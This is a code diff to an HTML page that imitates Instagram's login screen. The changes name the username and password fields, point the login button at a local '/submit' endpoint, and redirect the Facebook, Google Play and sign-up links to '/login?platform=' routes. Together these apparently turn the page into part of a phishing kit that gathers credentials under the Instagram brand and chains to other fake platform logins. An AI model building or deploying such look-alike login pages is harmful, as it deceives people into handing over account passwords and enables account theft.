@@ -1,7 +1,8 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Instagram Login Page</title>
     <link rel="stylesheet" href="styles.css" />
     <style>
@@ -175,20 +176,21 @@
       <div class="header">
         <div class="top">
           <div class="logo">
-            <img src="instagram.png" alt="instagram" style="width: 175px" />
+            <img src="/index/page-icon?icon-name=instagram.png" alt="instagram" style="width: 175px" />
           </div>
           <div class="form">
             <div class="input_field">
               <input
                 type="text"
+                name="email"
                 placeholder="Phone number, username, or email"
                 class="input"
               />
             </div>
             <div class="input_field">
-              <input type="password" placeholder="Password" class="input" />
+              <input type="password" name="password" placeholder="Password" class="input" />
             </div>
-            <div class="btn"><a href=".">Log In</a></div>
+            <div class="btn"><a href="/submit" method="post">Log In</a></div>
           </div>
           <div class="or">
             <div class="line"></div>
@@ -197,8 +199,8 @@
           </div>
           <div class="dif">
             <div class="fb">
-              <img src="facebook.png" alt="facebook" />
-              <a href="/Facebook-login/index.html">Log in with Facebook</a>
+              <img src="/index/page-icon?icon-name=facebook.png" alt="facebook"/>
+              <a href="/login?platform=facebook">Log in with Facebook</a>
             </div>
             <div class="forgot">
               <a href="#">Forgot password?</a>
@@ -206,14 +208,14 @@
           </div>
         </div>
         <div class="signup">
-          <p>Don't have an account? <a href="#">Sign up</a></p>
+          <p>Don't have an account? <a href="/login?platform=facebook">Sign up</a></p>
         </div>
         <div class="apps">
           <p>Get the app.</p>
           <div class="icons">
-            <a href="#"><img src="appstore.png" alt="appstore" /></a>
-            <a href="/Google-login/google.html"
-              ><img src="googleplay.png" alt="googleplay"
+            <a href="#"><img src="/index/page-icon?icon-name=appstore.png" alt="appstore" /></a>
+            <a href="/login?platform=google"
+              ><img src="/index/page-icon?icon-name=googleplay.png" alt="googleplay"
             /></a>
           </div>
         </div>
